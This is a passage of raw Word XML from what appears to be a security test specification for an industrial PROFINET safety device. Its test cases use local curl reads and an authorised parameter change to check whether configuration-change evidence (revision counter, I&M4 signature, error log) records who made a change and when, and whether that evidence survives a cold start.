              </w:rPr>
              <w:t xml:space="preserve">-modification evidence mechanisms exist and are readable: REVISION_COUNTER (I&amp;M0), </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/I&amp;M4 signature, and the Error Log; inspect each for actor identity and absolute timestamp.</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>(Firmware-modification evidence → RQ-008.)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="2CCFD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DE545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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6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17203" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">1. Read Error Log, I&amp;M0 REVISION_COUNTER, and I&amp;M4 at a known baseline. </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">2. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Record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which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fields</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> carry </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>identity</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>timestamp</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="63C4D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DA299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3A099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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS (partial baseline)</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> config-modification indicators are readable (CR 6.1 met). </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Documented shortfall</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> where no field carries actor identity or absolute timestamp (feeds CR 2.11/2.12).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="12B879E0" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete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511"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="44D6D6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28507B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A44AD1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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="23E48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D4A19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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6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0511C" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>TC-RQ009-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="2A9D7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E88A6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CFD48" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> eth1 = 192.168.50.10; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>browser</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> 192.168.50.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="180C2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12AB7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0AA8F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>curl / Visualizer; PN acyclic read for I&amp;M0 REVISION_COUNTER + I&amp;M4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2575274B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TC-RQ009-01 Config-modification evidence surface baseline (firmware evidence -&gt; RQ-008)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7121DE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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId228" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0901_log_base.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012D0F47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I&amp;M0 REVISION_COUNTER + I&amp;M4 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_iParCRC+F_Par_CRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) via acyclic PN read -&gt; TC0901_iandm_base.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38AFD12A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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Config indicators readable ☐ No identity/timestamp present | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC0901_log_base.json, TC0901_iandm_base.txt (REVISION_COUNTER + I&amp;M4) |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF7FED7" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:pict w14:anchorId="712E0148">
          <v:rect id="_x0000_i1614" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F86775" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ009-02 — Config-Modification Evidence &amp; Asymmetric Persistence (G-2 / G-3 proof — core)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA5B5D0" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6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759"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="4CC49E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3CE340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E6DD4C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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="19ACB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731D4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F5E97" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>TC-RQ009-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="31FB9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6B42E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AFAFD" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>RQ-009 → CR 2.8 / CR 2.11 / CR 3.9 → Asset B, Asset I</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="01260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D6050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4A54C" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Repudiation (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>config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modification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unattributed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>undated</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>detail</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> volatile)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="6FDEE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67EF1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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB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0A677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SVV-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (Threat-Mitigation </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="25072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6BDFE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3AED6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 xml:space="preserve">Demonstrate that a configuration modification (a) increments REVISION_COUNTER and changes the </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">/I&amp;M4 signature, but (b) carries </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no timestamp and no device-side actor</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, and (c) that after a cold start the </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>REVISION_COUNTER persists (durable count)</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> while the </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Error-Log event detail is cleared (volatile detail)</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — proving the config-</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>evidence is asymmetric and insufficient for CR 2.11/3.9.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="41775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78331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lastRenderedPageBreak/>
              <w:t xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6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0AE30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 xml:space="preserve">1. Baseline REVISION_COUNTER, I&amp;M4, Error Log, uptime. 2. Perform an </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iPar</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> change via the F-Host. 3. Re-read: confirm counter +1 and I&amp;M4 change; check for any timestamp/actor. 4. Cold-start. 5. Re-read: confirm counter retained but Error Log cleared and uptime reset.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="51F91F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7263D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2AF3A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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Gap-characterisation test.</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected:</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> counter increments and I&amp;M4 changes (config-change </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>that</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> recorded), </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no time/actor present</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, and after cold start the </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>counter survives while log detail is lost</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-2/G-3</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">, recorded as a </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> on the who/when/retention limbs.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5D33E2DC" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete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476"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="4F4E74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92E9BD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1DCD00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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="4B445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8B8F0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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6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B86EF" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>TC-RQ009-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="1BA2B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D93A32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A5459" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve">SPS 192.168.0.1, DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve"> eth1 = 192.168.50.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="7C181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5FA42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E8B06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>TIA Portal (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iPar</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> change); curl + PN acyclic read; power switch</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="44654BF8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TC-RQ009-02 Config change -&gt; evidence -&gt; persistence across cold start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D2045C7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(pre) capture REVISION_COUNTER, I&amp;M4, error log, uptime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A21D795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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId229" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0902_log_pre.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F58455F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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId230" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/systemtime/systick</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0902_tick_pre.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586A29F9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... read I&amp;M0 REVISION_COUNTER + I&amp;M4 via PN -&gt; TC0902_iandm_pre.txt ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD914D6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# --- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iPar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> change in TIA (e.g., Filter F-DI1 5ms-&gt;10ms), download ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52015EB6" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId231" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0902_log_chg.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="199B4775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... re-read I&amp;M0/I&amp;M4 -&gt; TC0902_iandm_chg.txt (expect counter+1, I&amp;M4 changed, NO time/actor) ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75111716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--- COLD START ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BAFA10D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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId232" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0902_log_cold.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC24585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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId233" w:history="1">
        <w:r w:rsidRPr="00AC6357">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/systemtime/systick</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC0902_tick_cold.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36F1B1F8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... re-read REVISION_COUNTER -&gt; expect RETAINED; log expect CLEARED; tick reset ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714548D6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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
